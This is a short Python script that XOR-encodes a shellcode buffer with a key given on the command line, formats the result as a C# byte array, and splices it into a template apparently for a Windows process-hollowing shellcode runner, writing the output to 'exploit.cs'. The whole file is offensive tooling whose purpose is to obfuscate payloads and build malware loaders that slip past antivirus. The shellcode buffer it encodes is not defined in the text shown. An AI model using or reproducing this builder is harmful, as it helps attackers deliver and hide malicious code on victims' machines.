
import sys
key = int(sys.argv[1],16) 
new_buff = b""
for i in buf:
	new_buff += ((i^key)& 0xff).to_bytes(1, 'little')

import binascii
hex_string = binascii.hexlify(new_buff)
j = [hex_string[i:i+2].decode() for i in range(0, len(hex_string), 2)]

payload = f'byte[] buf = new byte['
payload += str(len(j))
payload += '] {'
count = 0
for k in j:
	if count%12==0:
		payload += "\n\t\t\t\t"
	payload += f"0x{k}, "
	count+=1

payload = payload[:-2]
payload+= '\n\t\t\t'
payload+= '};'

with open(".windows_prochallowing_shellcode_runner_template.cs", 'r') as reader:
	template = reader.read()

exploit = template.replace("//SHELLCODE", payload).replace("//KEY", f'key = {hex(key)};')

with open("exploit.cs", 'w') as writer:
	writer.write(exploit)